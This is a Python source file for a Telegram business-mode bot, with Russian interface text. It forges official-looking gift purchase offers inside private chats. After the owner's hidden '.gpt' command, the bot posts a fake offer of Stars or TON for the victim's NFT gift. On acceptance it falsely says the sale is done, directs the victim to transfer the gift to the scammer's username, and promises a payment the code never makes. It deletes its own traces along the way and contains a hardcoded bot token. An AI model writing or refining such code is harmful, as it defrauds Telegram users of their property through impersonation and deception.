import asyncio
from aiogram import Bot, Dispatcher, F
from aiogram.types import Message, CallbackQuery, InlineKeyboardButton, InlineKeyboardMarkup, LinkPreviewOptions
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode

# --- НАСТРОЙКИ ---
BOT_TOKEN = "9132697740:AAFlvna4QfTfTaCZ6-RZ2fPGa2mBdba1l_A"

bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dispatcher = Dispatcher()

last_offer_data = {}
last_message_id = None

# --- ФУНКЦИЯ ДЛЯ БЕЗОПАСНОГО УДАЛЕНИЯ ---
async def safe_delete(chat_id, message_id, conn_id=None):
    if conn_id:
        try:
            await bot.delete_business_messages(
                business_connection_id=conn_id,
                message_ids=[message_id]
            )
            return
        except Exception:
            pass
    try:
        await bot.delete_message(chat_id=chat_id, message_id=message_id)
    except Exception:
        pass

# --- ОБРАБОТЧИК КОМАНДЫ .gpt ---
@dispatcher.business_message(F.text.startswith(".gpt"))
async def send_offer(message: Message):
    global last_offer_data, last_message_id
    if not message.business_connection_id:
        return

    try:
        connection = await bot.get_business_connection(message.business_connection_id)
        owner_id = connection.user.id
    except Exception:
        return

    if message.from_user.id != owner_id:
        return

    parts = message.text.split()
    
    if len(parts) != 4:
        return

    link = parts[1]
    amount = parts[2]
    currency_raw = parts[3].lower()

    if currency_raw not in ["stars", "ton", "gram"]:
        return

    if currency_raw == "stars":
        currency_display = "⭐ Stars"
    elif currency_raw == "ton":
        currency_display = "TON"
    else:
        currency_display = "Gram"

    nft_slug = link.rstrip("/").split("/")[-1]
    nft_prefix, separator, nft_number = nft_slug.rpartition("-")
    nft_name = f"{nft_prefix} #{nft_number}" if separator and nft_number.isdigit() else nft_slug

    # Просто пишем @username. Telegram сам сделает его ссылкой.
    sender_username = message.from_user.username
    if sender_username:
        sender_display = f"@{sender_username}"
    else:
        sender_display = message.from_user.first_name

    nft_link = f'<a href="{link}">{nft_name}</a>'
    hidden_link = f'<a href="{link}">&#8203;</a>'

    # ТЕКСТ КАК НА СКРИНШОТЕ
    offer_text = (
        f"<b>Пользователь {sender_display} предлагает Вам {amount} {currency_display} за подарок {nft_link}.</b>\n\n"
        f"<b>Предложение действует ещё 5ч 59м.</b>\n"
        f"{hidden_link}"
    )

    keyboard = InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text="✕ Отклонить", callback_data="decline"),
        InlineKeyboardButton(text="✓ Принять", callback_data="accept_offer")
    ]])

    last_offer_data = {
        "nft_name": nft_name,
        "amount": amount,
        "currency_display": currency_display,
        "link": link,
        "sender_username": sender_username,
        "business_connection_id": message.business_connection_id
    }

    if last_message_id:
        await safe_delete(message.chat.id, last_message_id, message.business_connection_id)

    try:
        msg = await bot.send_message(
            chat_id=message.chat.id,
            text=offer_text,
            reply_markup=keyboard,
            business_connection_id=message.business_connection_id,
            link_preview_options=LinkPreviewOptions(
                is_disabled=False,
                prefer_large_media=True,
                show_above_text=True
            )
        )
        last_message_id = msg.message_id
        await safe_delete(message.chat.id, message.message_id, message.business_connection_id)
    except Exception as e:
        print(f"Ошибка: {e}")

# --- ОБРАБОТЧИК "ПРИНЯТЬ" ---
@dispatcher.callback_query(F.data == "accept_offer")
async def on_accept_offer(callback: CallbackQuery):
    global last_message_id
    nft_name = last_offer_data.get("nft_name", "NFT")
    amount = last_offer_data.get("amount", "0")
    currency_display = last_offer_data.get("currency_display", "Stars")
    link = last_offer_data.get("link", "")
    conn_id = last_offer_data.get("business_connection_id")
    sender_username = last_offer_data.get("sender_username")

    nft_link = f'<a href="{link}">{nft_name}</a>'
    hidden_link = f'<a href="{link}">&#8203;</a>'
    target_account = f"@{sender_username}" if sender_username else "покупателю"

    new_text = (
        f"<b>Подарок успешно продан {nft_link}.</b>\n\n"
        f"<b>• Передайте подарок {target_account} для завершения сделки.</b>\n\n"
        f"<b>После передачи подарка вам автоматически зачислятся {amount} {currency_display} на ваш баланс.</b>\n"
        f"{hidden_link}"
    )

    new_keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Передать", url="tg://settings/my-profile/gifts")],
        [InlineKeyboardButton(text="Как передать?", callback_data="send_transfer")]
    ])

    await safe_delete(callback.message.chat.id, callback.message.message_id, conn_id)

    if last_message_id and last_message_id != callback.message.message_id:
        await safe_delete(callback.message.chat.id, last_message_id, conn_id)

    try:
        msg = await bot.send_message(
            chat_id=callback.message.chat.id,
            text=new_text,
            reply_markup=new_keyboard,
            business_connection_id=conn_id,
            link_preview_options=LinkPreviewOptions(
                is_disabled=False,
                prefer_large_media=True,
                show_above_text=True
            )
        )
        last_message_id = msg.message_id
    except Exception as e:
        print(f"Ошибка отправки: {e}")
    
    await callback.answer()

# --- ОБРАБОТЧИК "КАК ПЕРЕДАТЬ?" ---
@dispatcher.callback_query(F.data == "send_transfer")
async def on_send_transfer(callback: CallbackQuery):
    sender_username = last_offer_data.get("sender_username")
    target_account = f"@{sender_username}" if sender_username else "покупателю"

    alert_text = (
        f"1. Нажмите «Передать» под сообщением.\n"
        f"2. Перейдите в «Мои подарки» и выберите NFT.\n"
        f"3. Нажмите «Передать», выберите получателя и передайте подарок.\n\n"
        f"Нет в контактах? Найдите по {target_account}"
    )
    
    await callback.answer(alert_text, show_alert=True)

# --- ОБРАБОТЧИК "ОТКЛОНИТЬ" ---
@dispatcher.callback_query(F.data == "decline")
async def on_decline(callback: CallbackQuery):
    try:
        await callback.bot.delete_message(
            chat_id=callback.message.chat.id,
            message_id=callback.message.message_id
        )
    except Exception as e:
        print(f"Ошибка удаления при отказе: {e}")
    
    await callback.answer("Вы отклонили предложение.", show_alert=True)

async def main():
    print("Бот запущен (Business-режим).")
    await dispatcher.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
